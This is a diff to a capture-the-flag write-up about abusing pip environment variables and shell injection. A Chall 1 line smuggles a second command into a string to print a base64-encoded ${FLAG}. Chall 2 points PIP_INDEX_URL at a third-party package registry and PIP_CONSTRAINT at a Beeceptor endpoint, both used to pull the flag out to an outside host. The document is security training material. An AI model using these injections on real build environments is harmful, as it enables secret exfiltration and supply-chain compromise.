@@ -5,18 +5,23 @@ Hello, there!'; echo "Here is your flag: ${FLAG}" | base64 ;echo 'General Kenobi
 ```
  
 # Chall 2
-
 ## Solution 1
 [PIP environment variables doc](https://pip.pypa.io/en/latest/cli/pip_install/) PIP_<UPPER_LONG_NAME>
+
 [Pypi PyYAML](https://pypi.org/project/PyYAML/)
+
 [Cloudsmith](https://cloudsmith.io/~nebco/packages/)
 ``` bash
 Not a release :(
 PIP_INDEX_URL=https://cloudsmith.io/~nebco/packages/#
 ```
+Alternatives to cloudsmith :
+- Host your own registry server (local, AWS or other...)
+- Use github pages
 
 ## Solution 2
 [Beeceptor](https://beeceptor.com/)
+
 [Beeceptor for the demo](https://app.beeceptor.com/console/tdf123456)
 
 Configure Beeceptor :
@@ -30,11 +35,11 @@ PIP_CONSTRAINT=https://tdf123456.free.beeceptor.com/get-flag
 ```
 
 # Chall 3
-
 ## Solution 1
-[Bash variables doc](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
-[Beeceptor](https://beeceptor.com/)
-[Beeceptor for the demo](https://app.beeceptor.com/console/tdf123456)
+> [!TIP]
+> [Bash variables doc](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
+> [Beeceptor](https://beeceptor.com/)
+> [Beeceptor for the demo](https://app.beeceptor.com/console/tdf123456)
  
 ``` bash
 Not a release :(
